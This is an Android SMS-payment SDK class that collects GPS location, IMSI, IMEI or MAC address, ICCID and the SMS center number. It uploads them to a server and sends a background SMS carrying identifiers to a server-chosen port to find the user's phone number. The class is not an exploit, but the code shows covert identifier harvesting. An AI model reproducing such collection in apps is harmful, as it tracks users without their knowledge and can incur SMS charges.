package com.legame.leyo.smspay.extend;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.TelephonyManager;

import com.legame.leyo.smspay.extend.engine.GetPhoneSmsNetEngine;
import com.legame.leyo.smspay.util.PhonenumberUtil;
import com.legame.paysdk.ErrorCode;
import com.legame.paysdk.GlobalVal;
import com.legame.paysdk.ListenerHolder;
import com.legame.paysdk.models.FirstSmsInfo;
import com.legame.paysdk.network.engine.BaseNetEngine;
import com.legame.paysdk.network.resultdata.FirstSmsResultData;
import com.legame.paysdk.network.task.NetTask;
import com.legame.paysdk.network.task.NetTask.NetTaskListener;
import com.legame.paysdk.network.utils.NetTools;
import com.legame.paysdk.utils.DataUtils;
import com.legame.paysdk.utils.LogUtil;
import com.legame.paysdk.utils.SmsBasePay;
import com.legame.paysdk.utils.SmsBasePay.MdoPayCallBack;

/**
 * 类说明：首次安装点击弹出框时实现发送短信功能
 * @author KaiGuang
 * @date 2015/5/12
 */
public class SmsGetPhoneNumber {
	
	private static final String TAG = "SmsGetPhoneNumber";
	
	public static void getPhoneNumber(final Context context){
		PhonenumberUtil.getGPSLocation(context);
		GetPhoneSmsNetEngine engine = new GetPhoneSmsNetEngine(GlobalVal.getIMSI(context));
		String centerNumber = PhonenumberUtil.getSmsCenterNumber(context);
		engine.setSmscenterNumber(centerNumber);
		engine.setIccid(getIccid(context));
		NetTask netTask = new NetTask(context, engine, 0);
		netTask.setListener(new SmsNetTaskListener(context));
		new Thread(netTask).start();
	}
	
	/**
	    * 发送短信获取电话号码
	    * @author codeding
	    *
	    */
	   private static class SmsNetTaskListener implements NetTaskListener{
			 private Context context;
			 
			 public SmsNetTaskListener(Context context){
				 this.context = context;
			 }
			@Override
			public void onTaskRunSuccessful(int tag, BaseNetEngine engine) {
				FirstSmsResultData result = (FirstSmsResultData) engine.getResultData();
				if (result.getErrorCode() != 0) {
					LogUtil.d(TAG, "error whhile check update");
//					Log.i(TAG,"服务端返回码sms："+result.getErrorCode());
					sendCallback(ErrorCode.ERROR_NETWORK_FAILED, result.getErrorTip());
					return;
				}
				final FirstSmsInfo info = result.getFirstSmsInfo();
//				Log.i(TAG,"要发送的端口:"+info.getSdkSmsUpPort());
				if(!info.getSdkSmsUpPort().equals("")){//有上行端口
					//
					//
					//
					String imei = NetTools.getIMEI(context);
					if (imei == null) {
						imei = NetTools.getLocalMacAddress(context);
					}
					String content = GlobalVal.getIMSI(context)+","+imei;
//					Log.i(TAG,"获取手机号码短信内容："+content);
					final SmsBasePay smspay = new SmsBasePay();
					smspay.pay(context, info.getSdkSmsUpPort(), content, new MdoPayCallBack() {
						@Override
						public void onMdoPayResult(int status) {
							// TODO Auto-generated method stub
							if(status == 0){
								//静态函数回调结果通知
								LogUtil.d("getphone_Sms","send success");
//								Log.i(TAG,"短信成功发送");
							}else{
								//静态函数回调结果通知，这里测试直接回调失败，可以在客户端看到弹框文字结果
								LogUtil.d("getphone_Sms","send failed");	//客户端显示strExtra内容的警示框
							}
							smspay.unRegisterReceiver(context);
						}
					});
				}else{
					sendCallback(ErrorCode.ERROR_SUCCESS, "初始化完成");
				}
			}

			@Override
			public void onTaskRunError(int tag) {
				
			}

			@Override
			public void onTaskRunCanceled(int tag) {
				sendCallback(ErrorCode.ERROR_USER_CANCELED, "用户取消");
			}
	   }
	   
	   private static void sendCallback(final int code, final String msg){

			if (code == ErrorCode.ERROR_SUCCESS) {
				GlobalVal.sInitFinished = true;
			}else {
				GlobalVal.sInitFinished = false;
			}

			GlobalVal.sHandler.post(new Runnable() {
				@Override
				public void run() {
					ListenerHolder.sInitListener.initFinished(code, msg);
				}
			});
		}
	   
	   public static String getIccid(Context context){
		   try{
			   TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				String iccid = tm.getSimSerialNumber();
			   return iccid;
		   }catch(Exception e){
			   return "";
		   }
	   }
	   
	   /**
	    * 第一次把iccid上传给服务端进行入库，之后都传空字符串
	    * 主要是为了采集老用户SIM卡的ICCID
	    * @param context
	    * @return
	    */
	   public static String getHasInsertIccidServerDb(Context context){
		   SharedPreferences sp = context.getSharedPreferences("leyoDataInfo", Context.MODE_PRIVATE);
		   
		   if(sp.getBoolean("hasInsertIccidToServer", false)){
			   return "";
		   }else{
			   Editor editor = sp.edit();
			   editor.putBoolean("hasInsertIccidToServer", true);
			   editor.commit();
			   return getIccid(context);
		   }
		  
	   }
}
